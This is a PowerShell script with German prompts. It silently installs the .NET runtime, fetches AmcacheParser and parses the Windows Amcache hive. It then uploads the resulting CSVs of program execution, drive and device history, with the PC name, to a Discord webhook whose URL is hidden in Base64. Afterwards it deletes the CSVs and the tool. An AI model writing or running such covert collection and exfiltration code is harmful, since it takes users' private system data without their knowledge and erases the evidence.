$runtimeUrl      = "https://aka.ms/dotnet/9.0/dotnet-runtime-win-x64.exe"
$runtimeInstaller = "$env:TEMP\dotnet-runtime-installer.exe"


Invoke-WebRequest -Uri $runtimeUrl -OutFile $runtimeInstaller -UseBasicParsing


$install = Start-Process -FilePath $runtimeInstaller `
    -ArgumentList "/install", "/quiet", "/norestart" `
    -Wait -PassThru

Remove-Item $runtimeInstaller -ErrorAction SilentlyContinue

if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
    Write-Host "Runtime-Installation fehlgeschlagen (Exit $($install.ExitCode))."
    Read-Host "Druecke Enter zum Beenden"
    exit 1
}


$url        = "https://download.ericzimmermanstools.com/net9/AmcacheParser.zip"
$zipPath    = "$env:TEMP\AmcacheParser.zip"
$extractTo  = "C:\"


Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing


Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force


Remove-Item $zipPath

$exePath   = "C:\AmcacheParser.exe"
$hivePath  = "C:\Windows\AppCompat\Programs\Amcache.hve"
$outputDir = "C:\"


& $exePath -f $hivePath --csv $outputDir




$webhookUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODU2MTUxMjY4NjY4MjE2My9udFpwbWxZMFNVa2lBM0ViNTliT2JqLUxOdXp5NWVrRkQ1YnBtb3otMG5EQnEwSF9yR041MGF1RzVlbF9jLTJOQ2h4VQ=="))
$csvFiles   = @(Get-ChildItem -Path $outputDir -Filter "*Amcache*.csv") |
    Where-Object { $_.Name -match "UnassociatedFileEntries|DriveBinaries|DevicePnps" }
$pcName     = $env:COMPUTERNAME
$timestamp  = Get-Date -Format "dd.MM.yyyy HH:mm:ss"



$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyStream = New-Object System.IO.MemoryStream

$enc = [System.Text.Encoding]::UTF8

$payloadJson = '{"content":"**PC:** ' + $pcName + '\n**Zeit:** ' + $timestamp + '"}'
$partHeader  = "--$boundary${LF}Content-Disposition: form-data; name=`"payload_json`"${LF}Content-Type: application/json${LF}${LF}$payloadJson${LF}"
$bodyStream.Write($enc.GetBytes($partHeader), 0, $enc.GetByteCount($partHeader))

$i = 0
foreach ($file in $csvFiles) {
    $fileBytes   = [System.IO.File]::ReadAllBytes($file.FullName)
    $fileHeader  = "--$boundary${LF}Content-Disposition: form-data; name=`"files[$i]`"; filename=`"$($file.Name)`"${LF}Content-Type: text/csv${LF}${LF}"
    $headerBytes = $enc.GetBytes($fileHeader)
    $bodyStream.Write($headerBytes, 0, $headerBytes.Length)
    $bodyStream.Write($fileBytes,   0, $fileBytes.Length)
    $crlf = $enc.GetBytes($LF)
    $bodyStream.Write($crlf, 0, $crlf.Length)
    $i++
}

$closing = "--$boundary--$LF"
$bodyStream.Write($enc.GetBytes($closing), 0, $enc.GetByteCount($closing))

Invoke-RestMethod -Uri $webhookUrl `
    -Method Post `
    -ContentType "multipart/form-data; boundary=$boundary" `
    -Body $bodyStream.ToArray() | Out-Null

$bodyStream.Dispose()



Get-ChildItem -Path $outputDir -Filter "*Amcache*.csv" | Remove-Item -Force -ErrorAction SilentlyContinue


Get-ChildItem -Path $outputDir -Filter "AmcacheParser*" |
    Where-Object { $_.Extension -in ".exe", ".dll", ".json" } |
    Remove-Item -Force -ErrorAction SilentlyContinue




